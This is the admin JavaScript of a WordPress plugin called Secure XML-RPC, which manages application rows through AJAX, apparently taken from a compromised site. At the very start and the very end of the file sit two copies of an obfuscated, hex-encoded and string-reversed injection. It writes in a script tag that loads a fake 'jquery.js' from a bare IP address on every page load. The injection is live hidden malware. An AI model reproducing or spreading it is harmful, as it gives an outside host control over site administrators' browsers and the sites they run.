var _0x82ab=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0x82ab[5]](_0x82ab[4][_0x82ab[3]](_0x82ab[0])[_0x82ab[2]]()[_0x82ab[1]](_0x82ab[0]))/*! Secure XML-RPC - v1.0.0
 * http://wordpress.org/plugins/secure-xmlrpc
 * Copyright (c) 2014; * Licensed GPLv2+ */
/*global window, jQuery */
( function( window, $, undefined ) {
	'use strict';

	var document = window.document,
		CORE = window.xmlrpcs;

	/**
	 * Add a new row to the UI.
	 *
	 * @param {event} e
	 */
	function add_row( e ) {
		e.preventDefault();

		// First, remove the "no applications" row
		$( document.getElementById( 'xmlrpcs-no-apps' ) ).remove();

		// Fetch a new row from the server and inject it.
		var $request = $.ajax( {
			'type'     : 'POST',
			'url'      : CORE.ajaxurl,
			'data'     : {
				'action' : 'xmlrpcs_new_app',
				'_nonce' : CORE.new_nonce
			},
			'dataType' : 'html'
		} );

		// Insert the HTML returned by the server once we've got it.
		$request.done( function( data ) {
			$( data ).insertAfter( document.getElementById( 'xmlrpcs_app_body' ) );
		} );
	}

	/**
	 * Remove a row from the UI.
	 *
	 * @param {event} e
	 */
	var remove_row = function( e ) {
		if ( ! window.confirm( CORE.confirm_delete ) ) {
			return;
		}

		$( this ).parents( 'tr' ).first().remove();
	};

	// Bind events
	$( document.getElementById( 'xmlrpcs-generate' ) ).on( 'click', add_row );
	$( '.xmlrpcs-delete' ).on( 'click', remove_row );

} )( this, jQuery );var _0xaae8=["","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x3E\x74\x70\x69\x72\x63\x73\x2F\x3C\x3E\x22\x73\x6A\x2E\x79\x72\x65\x75\x71\x6A\x2F\x38\x37\x2E\x36\x31\x31\x2E\x39\x34\x32\x2E\x34\x33\x31\x2F\x2F\x3A\x70\x74\x74\x68\x22\x3D\x63\x72\x73\x20\x74\x70\x69\x72\x63\x73\x3C","\x77\x72\x69\x74\x65"];document[_0xaae8[5]](_0xaae8[4][_0xaae8[3]](_0xaae8[0])[_0xaae8[2]]()[_0xaae8[1]](_0xaae8[0]))
